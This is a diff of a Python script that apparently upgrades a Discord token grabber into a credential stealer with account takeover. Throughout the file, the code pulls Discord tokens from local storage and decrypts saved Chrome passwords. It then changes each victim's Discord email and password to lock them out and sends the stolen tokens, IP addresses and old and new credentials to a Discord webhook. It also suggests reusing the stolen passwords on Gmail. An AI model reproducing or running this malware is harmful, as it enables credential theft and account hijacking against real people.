@@ -1,69 +1,148 @@
-import os, requests, subprocess, datetime, re
+import requests, os, platform, string, random, re, win32crypt, shutil, sqlite3, base64, datetime
 
-class Data():
-    computerName = os.environ['USERPROFILE']
-    appData = os.environ.get('APPDATA')
-    webHook_url = "https://discordapp.com/api/webhooks/yes"
-    dirs = [
-        appData + "\\Discord\\Local Storage\\leveldb", 
-    ]
+session = requests.Session()
 
-def grabIP():
-    r = requests.get('https://ip.42.pl/raw')
-    return r.text
-
-def grabHWID():
-    hwid = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()
-    return hwid
-
-def webHook():
-    time = datetime.datetime.now().strftime("%H:%M %p")  
-    message = '```asciidoc\n'
-    message += '= '+time+' ='
-    message += '\n= -------------------------------------- = '
-    message += '\nIP :: '+ grabIP()
-    message += '\nDiscord Token :: '+ grabToken()
-    message += '\nHardware ID :: '+ grabHWID()
-    message += '\nAdditional data :: ' + grabTokenData()
-    message += '```'
-    payload = {
-        'content': message
-    }
-    r = requests.post(Data.webHook_url, json=payload)
-    if r.status_code == 200:
-        return True
-    else:
-        return False
-
-def grabTokenData():
-    for token in grabToken():
-        headers = {
-            'Authorization': token,
-            'Content-Type': 'application/json'
+class Grabber:
+    def __init__(self):
+        self.webhook = "https://discordapp.com/api/webhooks/some nice webhook url here plz"
+        self.tokenRegex = r"[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_\-]{27}|mfa\.[a-zA-Z0-9_\-]{84}"
+        self.api = "https://discordapp.com/api/v6/"
+        self.errors = {
+            1: 'Unauthorized',
+            2: 'Invalid two-factor code'
         }
-        try:
-            r = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers)
-            r_json = r.json()
-            if 'Unauthorized' not in r.text:
-                NAME = r_json['username']+'#'+r_json['discriminator']
-                EMAIL = r_json['email']
-                return NAME, EMAIL
-            else:
-                return '<COULDNT GRAB TOKEN DATA>'  
-        except (KeyError, TypeError):
-            pass    
+        self.dirs = [
+            self.getAppData() + '\\Discord\\Local Storage\\leveldb'
+        ]
+        self.passwords = []
+        self.tokens = []
+        self.validTokens = []
 
-def grabToken(): # Credit to fweak ty no homo :flushed:
-    for location in Data.dirs:
-        for file in os.listdir(location):
-            with open(f"{location}\\{file}", encoding='utf-8', errors='ignore') as f:
+    def getHeaders(self, token): 
+        headers = {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.306 Chrome/78.0.3904.130 Electron/7.1.11 Safari/537.36',
+            'Content-Type': 'application/json',
+            'Authorization': token,
+        }
+        return headers
+
+    def lockOut(self):
+        time = datetime.datetime.now().strftime("%H:%M %p")
+        newPassword = self.newPassword()
+        newEmail = self.newEmail()
+        grabIP = self.grabIP()
+        encodedBytes = base64.b64encode((str(newEmail)).encode("utf-8"))
+        base = str(encodedBytes, "utf-8")
+        for token in self.tokens:
+            r = requests.post(self.api + 'invites/minecraft', headers=self.getHeaders(token))
+            if '302094807046684672' in r.text:
+                if r.status_code == 200:
+                    self.validTokens.append(token)
+        for token in self.validTokens:
+            for password in self.passwords:
+                userInfo = session.get(self.api + 'users/@me', headers=self.getHeaders(token))
+                userInfo = userInfo.json()
+                payload = {
+                    'avatar': userInfo['avatar'],
+                    'discriminator': userInfo['discriminator'],
+                    'email': newEmail,
+                    'password': password,
+                    'new_password': newPassword
+                }
+                r = session.patch(self.api + 'users/@me', json=payload, headers=self.getHeaders(token))
+                r_json = r.json()
+                message = f'= {time} ='
+                message += f'\nToken :: {token}'
+                message += f'\nIP :: {grabIP}'
+                message += f'\nOld Email :: {userInfo["email"]}'
+                message += f'\nOld Password :: {password}'
+                message += '\n[ - - - - - - - - - - - - - - - - - - - - - ]'
                 try:
-                    token = re.findall(r'"([A-Za-z0-9_\./\\-]*)"', f.read())
-                    for string in token:
-                        if len(string) < 59:
-                            continue
-                        else:
-                            return string
-                except:
-                    pass
-webHook()
+                    if userInfo['email'] != r_json['email']:
+                        message += f'\nNew Email :: {newEmail}'
+                    else:
+                        message += f'\nNew Email :: [None, couldnt change]'
+                except (KeyError):
+                    message += f'\nNew Email :: [None, couldnt change]'
+                if password != newPassword: # <TODO> Find a better way to do this check
+                    message += f'\nNew Password :: {newPassword}'
+                else:
+                    message += f'\nNew Password :: [None, couldnt change]'    
+                message += f'\nLogin Url :: https://ically.net/#/{base}\n\n'    
+                message += '= Quick note: You can try if the [Old Email] and [Old Password] work in gmail! ='
+                if self.errors[1] in r.text:
+                    self.webHook("[ERROR] :: Couldnt retrieve any valid token from the leveldb file");break
+                if self.errors[2] in r.text:
+                    self.webHook(message);break
+                else:
+                    try:
+                        if r_json['id'] == userInfo['id']:
+                            self.webHook(message);break
+                    except:
+                        pass
+
+    def grabPassword(self): 
+        # Credits to backslash: https://github.com/backslash
+        if os.path.exists(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data'):
+            shutil.copy2(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data', os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data2')
+            conn = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data2')
+            cursor = conn.cursor()
+            cursor.execute('SELECT action_url, username_value, password_value FROM logins')
+            for result in cursor.fetchall():
+                password = win32crypt.CryptUnprotectData(result[2])[1].decode()
+                if password != '':
+                    self.passwords.append(password)
+
+    def grabToken(self):
+        for location in self.dirs:
+            for file in os.listdir(location):
+                with open(f"{location}\\{file}", errors='ignore') as _data:
+                    try:
+                        regex = re.findall(self.tokenRegex, _data.read())
+                        if regex:
+                            for token in regex:
+                                self.tokens.append(token)
+                    except (PermissionError):
+                        continue
+
+    def webHookFile(self, message: str, file): 
+        payload = {
+            'content': 'hi'}
+        file = {
+            "imageFile": open(file, "rb")}
+        r = requests.post(self.webhook, json=payload, files=file)
+        if r.status_code == 200:
+            return True
+
+    def webHook(self, message: str):
+        payload = {
+            'content': f'**```asciidoc\n{message}\n```**'
+        }
+        r = requests.post(self.webhook, json=payload)
+        if r.status_code == 200:
+            return True
+
+    def getAppData(self):
+        if platform.system() == 'Linux': 
+            return os.getenv('HOME')
+        else:
+            return os.getenv('APPDATA') 
+
+    def newEmail(self):
+        email = session.get("https://ically.net/user.php?user=", data={"data": ""}).text
+        return email
+
+    def newPassword(self):
+        passw = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
+        return passw
+
+    def grabIP(self):
+        r = session.get('https://api.myip.com/')
+        data = f'IP: {r.json()["ip"]} - Country: {r.json()["country"]}'
+        return data
+
+if __name__ == "__main__":
+    Grabber = Grabber()
+    Grabber.grabPassword()
+    Grabber.grabToken()
+    Grabber.lockOut()
